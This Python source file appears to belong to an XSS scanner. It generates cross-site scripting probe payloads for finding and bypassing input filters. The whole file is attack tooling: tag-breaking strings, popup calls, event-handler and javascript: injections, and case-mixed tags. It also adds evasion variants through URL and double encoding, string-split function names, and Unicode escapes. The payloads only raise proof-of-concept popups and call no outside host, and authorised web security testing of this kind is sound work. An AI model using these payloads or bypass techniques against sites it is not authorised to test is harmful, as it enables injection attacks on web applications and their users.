import re
keyword = {
    'close': [],
    'close_tag': [],
    'action': [],
    'onevent': [],
    'tag': [],
    'others': [],
    'illusion': [],
    'combination_close_no':[],
    'combination_close_yes':[]}


def keyword_init():
    global keyword
    keyword.clear()
    keyword['close'] = [
        "%22591",
        "%27591",  # 以上，测试>"'是否过滤
        ">591",
        "<591",
        "%3e591",
        "%3c591",
        "/591",
        "%2f591",
        "\"591",
        "\'591"
        # "</IfrAme>591",
        # "</A>591",
        # "/>591"
    ]
    keyword['close_tag'] = [
        "\"591",
        "\'591",
        "/>591",
        "%2f>591",
        "</IfrAme>591",
        "</A>591",
        "<%2fIfrAme>591",
        "<%2fA>591"
    ]

    keyword['action'] = ["prompt(591)",
                         "prompt`591`",
                         "confirm(591)",
                         "confirm`591`",
                         "alert(591)",
                         "alert`591`",
                         "window[`ale`+`rt`]`591`",
                         "window[`ale`%2b`rt`]`591`",
                         "window[`ale`%252b`rt`]`591`",
                         "window['ale'+'rt'](591)",
                         "window['ale'%2b'rt'](591)",
                         "window['ale'%252b'rt'](591)",
                         "eval(591)"
                         ]

    keyword['onevent'] = ["oNwHeEl=591",
                          "oNcLIck=591",
                          "OnmOuseOver=591",
                          "OnmoUseoUt=591",
                          "ONfoCus=591",
                          "oNloAd=591", # <body onload=alert(1)>
                          "oNErrOr=591",
                          "SrC=591",
                          # "eval(\""+''.join((r'\x%2x'%ord(c)for c in 'alert(591)'))+"\")", 会报错：bad escape \x at position 6，查询了下貌似是 python3 的问题
                          # eval("\x61\\x6c\\x65\\x72\\x74\\x28\\x27\\x78\\x73\\x73\\x27\\x29 \"), #这个动作可以和 onerror 搭配使用
                          "HReF=jAvAScRipt:591"]  # <A HReF=jAvAScRipt:591>aaaa</a>
    keyword['tag'] = ["<IfrAme>591</IfrAme>",
                      "<A>591</A>",
                      "<ScRipt>591</ScRipt>",
                      "<iNpUt>591",
                      "<BoDy>591",
                      "<ImG>591"
                      ]

    keyword['others'] = [
        "<ScRipt>591<ScrIpt>",
        "%3cScRipt%3e591%3cScrIpt%3e",
        "<a%20onwheel=prompt`591`>591</a>",
        "<a%20onwheel=prompt(591)>591</a>",
        "<a/onwheel=prompt(591)>591</a>",
        "<a/onwheel=window[`con`+`firm`]`591`>591</a>",
        "<a/onwheel=window[`con`%2b`firm`]`591`>591</a>",
        "<a/onwheel=window[`con`%252b`firm`]`591`>591</a>",
        "<a/onwheel=window['al'%2b'ert']()>591",
        "\"'\"%20accesskey=\"m\"onclick=\"prompt(591)%20",
        "%20auTofoCus%20onFoCus=prompt`591`",
        "<BoDy oNloAd=prompt(591)>"
    ]

    keyword['illusion'] = [
        "<A/OnwHeEl=prompt(591)>591</A>",
        "<BoDy oNloAd=prompt(591)>",

    ]

    keyword['combination_close_no'] = [

    ]
    keyword['combination_close_yes'] = [

    ]
    payload2unicode()
    # [print(e) for e in keyword]


def keyword_(key):
    global keyword
    while key == "<>":
        keyword_2 = []
        for w1 in keyword:
            if re.search("<|>", w1):
                w2 = ""
                if re.search("<", w1):
                    w2 = re.sub("<", "%3c", w1)
                    if re.search(">", w2):
                        w2 = re.sub(">", "%3e", w2)
                    keyword_2.append(w2)
                else:
                    if re.search(">", w1):
                        w2 = re.sub(">", "%3e", w1)
                    keyword_2.append(w2)
        keyword += keyword_2
        break
    while key == "\"'>":
        newlist = ["\"'>" + i for i in keyword]
        keyword = newlist
        # [print(e) for e in keyword]
        break

    # def keyword_add_clog(self):



# 将 action[]中每个 payload 中的字母转换为 unicode 码 ———— 支持弹窗函数的 unicode 编码绕过方法
def payload2unicode():
    keyword['action_bak']=[]
    for p0 in keyword['action']:
        keyword['action_bak'].append(p0)

    for p1 in keyword['action_bak']:
        s2=""
        for s in p1:
            if s.isalpha() and s != "b":   # 避免出现将%252b 中的 b 编码，会造成无法解析
                s2+=hex(ord(s)).replace("0x", "\\u00")
            else:
                s2+=s
        # print(s2)
        keyword['action'].append(s2)


# if __name__ == '__main__':
#     keyword_init()
#     payload2unicode()
#     for p3 in keyword['action']:
#         print(p3)